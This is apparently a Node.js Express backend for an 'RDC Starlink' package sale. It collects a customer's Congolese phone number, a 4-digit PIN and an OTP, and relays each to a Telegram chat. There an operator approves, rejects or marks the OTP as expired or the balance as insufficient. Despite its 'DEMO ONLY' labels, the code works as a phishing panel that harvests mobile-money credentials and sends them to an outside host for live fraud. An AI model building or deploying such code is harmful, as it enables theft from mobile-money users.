const express = require("express");
const cors = require("cors");
const dotenv = require("dotenv");

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

const requests = new Map();
let lastUpdateId = 0;

function createId() {
  return `${Date.now()}-${Math.random().toString(36).slice(2, 9)}`;
}

function telegramConfigured() {
  return Boolean(
    process.env.TELEGRAM_BOT_TOKEN &&
    process.env.TELEGRAM_CHAT_ID
  );
}

async function telegram(method, body) {
  if (!telegramConfigured()) {
    throw new Error("Telegram environment variables are not configured.");
  }

  const url =
    `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/${method}`;

  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(body)
  });

  const data = await response.json();

  if (!response.ok || !data.ok) {
    throw new Error(
      data.description || "Telegram request failed."
    );
  }

  return data;
}

async function sendPinApproval(request) {
  const text =
    "🚀 RDC STARLINK — STEP 1\n\n" +
    `📦 Package: ${request.packageName}\n` +
    `⏳ Validity: ${request.validity}\n` +
    `💰 Price: ${request.price}\n` +
    `📱 Phone: ${request.phone}\n` +
    `🔐 Demo PIN: ${request.demoPin}\n\n` +
    "⚠️ DEMO ONLY — this PIN must not be a real mobile-money PIN.\n\n" +
    "Approve the phone + PIN request to open the customer's OTP page.";

  const keyboard = {
    inline_keyboard: [
      [
        {
          text: "✅ APPROVE",
          callback_data: `pin_approve:${request.id}`
        },
        {
          text: "❌ REJECT",
          callback_data: `pin_reject:${request.id}`
        }
      ]
    ]
  };

  await telegram("sendMessage", {
    chat_id: process.env.TELEGRAM_CHAT_ID,
    text,
    reply_markup: keyboard
  });
}

async function sendOtpApproval(request) {
  const text =
    "🚀 RDC STARLINK — STEP 2\n\n" +
    `📦 Package: ${request.packageName}\n` +
    `⏳ Validity: ${request.validity}\n` +
    `💰 Price: ${request.price}\n` +
    `📱 Phone: ${request.phone}\n` +
    `🔐 Demo OTP: ${request.demoOtp || "(new OTP requested)"}\n\n` +
    "⚠️ DEMO ONLY — do not use a real payment OTP.\n\n" +
    "This is a NEW request after the first approval.";

  const keyboard = {
    inline_keyboard: [
      [
        {
          text: "✅ APPROVE OTP",
          callback_data: `otp_approve:${request.id}`
        },
        {
          text: "❌ REJECT OTP",
          callback_data: `otp_reject:${request.id}`
        }
      ],
      [
        {
          text: "⏰ OTP EXPIRED",
          callback_data: `otp_expired:${request.id}`
        },
        {
          text: "💰 INSUFFICIENT MONEY",
          callback_data: `insufficient:${request.id}`
        }
      ]
    ]
  };

  await telegram("sendMessage", {
    chat_id: process.env.TELEGRAM_CHAT_ID,
    text,
    reply_markup: keyboard
  });
}

app.get("/", (req, res) => {
  res.json({
    status: "online",
    service: "RDC Starlink demo backend"
  });
});

app.post("/api/requests", async (req, res) => {
  try {
    const {
      packageName,
      validity,
      price,
      phone,
      demoPin
    } = req.body;

    if (
      !packageName ||
      !validity ||
      !price ||
      !phone ||
      !demoPin
    ) {
      return res.status(400).json({
        error: "Package, phone and demo PIN are required."
      });
    }

    const normalizedPhone = String(phone).replace(/\s+/g, "");

    if (!/^\+2439\d{8}$/.test(normalizedPhone)) {
      return res.status(400).json({
        error: "Phone number must be +243 followed by 9 digits beginning with 9."
      });
    }

    if (!/^\d{4}$/.test(String(demoPin))) {
      return res.status(400).json({
        error: "Demo PIN must contain exactly 4 digits."
      });
    }

    const request = {
      id: createId(),
      packageName: String(packageName),
      validity: String(validity),
      price: String(price),
      phone: normalizedPhone,
      demoPin: String(demoPin),
      demoOtp: "",
      status: "pending_pin",
      createdAt: new Date().toISOString()
    };

    requests.set(request.id, request);

    await sendPinApproval(request);

    res.status(201).json({
      success: true,
      requestId: request.id
    });
  } catch (error) {
    console.error("PIN request error:", error);

    res.status(500).json({
      error: "Unable to submit the request."
    });
  }
});

app.get("/api/requests/:id", (req, res) => {
  const request = requests.get(req.params.id);

  if (!request) {
    return res.status(404).json({
      error: "Request not found."
    });
  }

  res.json(request);
});

app.post("/api/requests/:id/otp", async (req, res) => {
  try {
    const request = requests.get(req.params.id);

    if (!request) {
      return res.status(404).json({
        error: "Request not found."
      });
    }

    if (
      request.status !== "pin_approved" &&
      request.status !== "otp_expired" &&
      request.status !== "otp_rejected"
    ) {
      return res.status(400).json({
        error: "The first approval must happen before an OTP request."
      });
    }

    const demoOtp = String(req.body.demoOtp || "");

    if (demoOtp && !/^\d{4}$/.test(demoOtp)) {
      return res.status(400).json({
        error: "Demo OTP must contain exactly 4 digits."
      });
    }

    request.demoOtp = demoOtp;
    request.status = "pending_otp";

    requests.set(request.id, request);

    await sendOtpApproval(request);

    res.json({
      success: true
    });
  } catch (error) {
    console.error("OTP request error:", error);

    res.status(500).json({
      error: "Unable to submit OTP request."
    });
  }
});

async function processTelegramUpdates() {
  try {
    if (!telegramConfigured()) {
      return;
    }

    const url =
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}` +
      `/getUpdates?offset=${lastUpdateId + 1}&timeout=1`;

    const response = await fetch(url);
    const data = await response.json();

    if (!data.ok || !Array.isArray(data.result)) {
      return;
    }

    for (const update of data.result) {
      lastUpdateId = update.update_id;

      const callback = update.callback_query;

      if (!callback || !callback.data) {
        continue;
      }

      const [action, requestId] = callback.data.split(":");
      const request = requests.get(requestId);

      if (!request) {
        await telegram("answerCallbackQuery", {
          callback_query_id: callback.id,
          text: "Request not found."
        });
        continue;
      }

      if (action === "pin_approve") {
        request.status = "pin_approved";
      }

      if (action === "pin_reject") {
        request.status = "pin_rejected";
      }

      if (action === "otp_approve") {
        request.status = "otp_approved";
      }

      if (action === "otp_reject") {
        request.status = "otp_rejected";
      }

      if (action === "otp_expired") {
        request.status = "otp_expired";
      }

      if (action === "insufficient") {
        request.status = "insufficient_money";
      }

      requests.set(request.id, request);

      await telegram("answerCallbackQuery", {
        callback_query_id: callback.id,
        text: "Response recorded."
      });
    }
  } catch (error) {
    console.error("Telegram polling error:", error.message);
  }
}

setInterval(processTelegramUpdates, 2000);

app.listen(PORT, () => {
  console.log(`RDC Starlink backend running on port ${PORT}`);
});
